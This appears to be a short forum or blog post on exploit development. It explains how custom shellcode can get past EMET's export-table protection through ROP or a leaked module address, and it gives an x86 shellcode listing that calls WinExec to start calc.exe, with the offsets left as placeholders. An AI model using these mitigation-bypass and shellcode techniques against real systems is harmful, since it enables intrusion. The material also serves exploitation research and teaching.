    Right the custom shellcodes provide us with more control over cpu and exploitation.
    Moreover we can evade the mitigations placed by antivirus engines and OS.
    For examples in 2010, Microsoft released EMET Enhanced Mitigation Toolkit to avoid the execution of most of the shellcodes.
    What it does is it sets a hardware breakpoint on the access to the EAT (Export Address Table) of the DLLs from any code executing outside any loaded module's code section.

    Such mitigation can be bypassed as in its own definition, by ROPing the stage to extract the exported functions RVA.

    Similarly if we grab any module's address from any leak or any ways, we can then grab any pointer to kernel32.dll (and all required DLLs) from several locations and then calculate the offsets (RVAa) offset of All required functions.

    For examples follwoing is the tiny shellcode to execute the command using WinExec:

    ESI contains The base address of any loaded DLL x.dll, grabbed from a memory leak.


    ---------------------------------
    90 NOP
    8B86 xxxxxxxx MOV EAX,DWORD PTR DS:[ESI+Offset1]
    ;Offset1 is the offset of a pointer to any export function of Kernel32 inside
    56 PUSH ESI
    50 PUSH EAX
    6A 05 PUSH 5
    68 yyyyyyyy PUSH Address1;Adddress of command ASCII "calc.exe"
    05 zzzzzzzz ADD EAX,Offset2
    ;Offset2 is the offset of WinExec from Kernel32.dll
    FFD0 CALL EAX
    ---------------------------
